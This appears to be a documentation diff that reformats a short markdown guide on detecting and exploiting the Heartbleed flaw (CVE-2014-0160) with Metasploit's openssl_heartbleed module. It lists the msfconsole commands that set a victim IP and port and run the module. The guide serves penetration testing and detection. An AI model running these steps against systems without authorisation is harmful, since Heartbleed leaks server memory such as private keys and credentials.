@@ -1,31 +1,20 @@
 [Metasploit](https://www.metasploit.com/) can be used to detect and exploit Heartbleed (CVE-2014-0160) using the openssl_heartbleed auxiliary module.
 
-Run msfconsole command and use scanner module.
+Run msfconsole:
 ```BASH
 msfconsole
 ```
 
+Use the scanner module:
 ```BASH
 use auxiliary/scanner/ssl/openssl_heartbleed
 ```
 
-SET RHOSTS
+Set the parameters and run the exploit:
 ```BASH
 set RHOSTS VICTIM_IP_ADDRESS
-```
-
-SET RPORT
-```BASH
 set RPORT 443
-```
-
-Add verbose mode
-```
 set VERBOSE true
-```
-
-Use run command
-```BASH
 run
 ```
 
